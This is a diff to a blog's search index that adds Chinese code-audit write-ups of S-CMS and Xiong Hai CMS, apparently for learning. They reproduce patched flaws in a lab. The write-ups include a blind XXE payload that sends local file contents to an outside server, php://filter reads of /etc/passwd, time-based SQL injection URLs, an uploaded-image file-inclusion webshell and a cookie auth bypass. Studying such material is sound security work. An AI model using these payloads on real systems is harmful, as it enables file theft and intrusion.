@@ -1,6 +1,18 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[S-CMS代码审计]]></title>
+    <url>%2F2019%2F10%2F31%2F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%2FS-CMS%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0%2F</url>
+    <content type="text"><![CDATA[来源：对S-CMS的一次全面审计 CMS官网：https://www.s-cms.cn/download.html 说明：目前官网已对漏洞进行修复，为便于复现取消了修补手段。 审计复现XXE-1全局搜索simplexml，在weixin/index.php发现漏洞（官网已修复） 非常标准的XXE，没有任何过滤手段，往下并未发现有输出XML解析结果的地方，此处应用无回显的XXE攻击手段 漏洞利用 首先在自己的服务器（192.168.64.131）上创建一个供靶机外部引用的dtd文件（test.dtd） 1234&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://192.168.64.131/?%file;&apos;&gt;&quot;&gt;%all; 发送POC 1234567&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=d:/phpStudy/PHPTutorial/WWW/robots.txt&quot;&gt; &lt;!ENTITY % dtd SYSTEM &quot;http://192.168.64.131/test.dtd&quot;&gt;%dtd;%send;]&gt; 然后在Apache日志中查看到结果： 在这里发现一个问题，查看其它php文件的内容会发生Detected an entity reference loop错误，查询资料发现libxml解析器默认限制外部实体长度为2k，无法突破，只能寻找压缩解决方案（但效果不明显） 12压缩：echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd");解压：echo file_get_contents("php://filter/read=convert.base64-decode/zlib.inflate/resource=/tmp/1"); 关于XXE： 最好的防御手段应该是禁止外部实体 12345678910PHP：libxml_disable_entity_loader(true);JAVA:DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);Python：from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) 另外在libxml2.9之后，默认禁止外部实体 SQL注入-1在XXE-1往下看，存在SQL注入（已修复，添加防御函数t()） 根据文章注入 顺便看看修补的过滤函数，无法闭合语句达到绕过目的（此处修补了两次） SQL注入-2漏洞位置：index.php 跟进函数splitx() 12345function splitx($a, $b, $c)&#123; $d = explode($b, $a); return $d[$c];&#125; 先上payload 1http://127.0.0.1/index.PHP/a'%20where%20if(1,sleep(5),1)%23?action=update_dir 拼凑SQL语句 1update TABLE_config set C_dir='index.PHP/a' where if(1,sleep(5),1)#' 解释 $_SERVER[‘PHP_SELF’]：获取当前文件的路径 如：127.0.0.1/xxe/xml.php =&gt; /xxe/xml.php explode(separator,string,limit)：分割字符串形成数组 separator：规定在哪里分割字符串。 string：要分割的字符串。 limit：规定所返回的数组元素的数目。 如果使用index.php，结果如下： 123array (size=2) 0 =&gt; string '/index.php/' (length=5) 1 =&gt; string '/a' where if(1,sleep(5),1)#' (length=27) 被截断，但若使用index.PHP： 12array (size=1) 0 =&gt; string '/index.PHP/a' where if(1,sleep(5),1)#' (length=39) 前提：Windows系统下不区分文件大小写。 总结原计划先自己审计一次，但的确是积累不够，无法审计出，并且一些配置文件的代码经过混淆；所以决定按照文章进行复现，学习下思路。 虽然这个cms已修复，但复现的过程对代码审计有些收获：过去的几个审计是先黑盒确定功能点，再溯源代码，追踪数据，这种方式在小型CMS中可行，但中大型CMS中可能比较繁琐，需要耐心统计出所有功能并定位文件位置。现在一个小方法是积累风险函数字典，定位函数确定审计入手点，就如本CMS中的XXE漏洞。]]></content>
+      <categories>
+        <category>代码审计</category>
+      </categories>
+      <tags>
+        <tag>web安全</tag>
+        <tag>代码审计</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[熊海CMS代码审计]]></title>
     <url>%2F2019%2F10%2F20%2F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%2F%E7%86%8A%E6%B5%B7CMS%2F</url>
     <content type="text"><![CDATA[前言接下来的一段时间将进行PHP代码审计的学习，对简单CMS进行审计与记录。 代码审计先使用Seay源代码审计系统自动审计一下 简单浏览一下站点，发现浏览器文章时候可以指定id，怀疑存在sql注入 同时定位到/files/content.php 对id使用了addslashes()，无法进一步利用，在19行可以通过报错得出数据库和数据表名 addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。 预定义字符是：单引号（’）、双引号（”）、反斜杠（\）、NULL SQL注入检查后台登录login.php文件 对输入数据完全没有进行过滤，那么可以爆出管理员密码 任意文件包含站点入口文件存在任意文件包含 登录到后台时发现了文件上传功能，可以上传图片马，再进行文件包含 上传功能仅对文件后缀进行了判断，白名单：jpg|jpeg|gif|bmp|png 首页包含即可：http://192.168.0.108/isea/index.php?r=../upload/touxiang/53311568373471.jpg 越权访问垂直越权，直接进入后台管理 进入/inc/checklogin.php，发现仅仅对cookie是否存在user字段是否存在进行判断，抓包添加user字段即直接进入后台管理 CSRF漏洞后台管理存在删除文件的功能，抓包查看 若直接访问，自动返回到登录界面 1http://192.168.0.108/isea/admin/?r=wzlist&amp;delete=18 抓包添加cookie user字段后成功删除文章 总结这套CMS结构非常的基础，作为代码审计初学者练手还是不错]]></content>
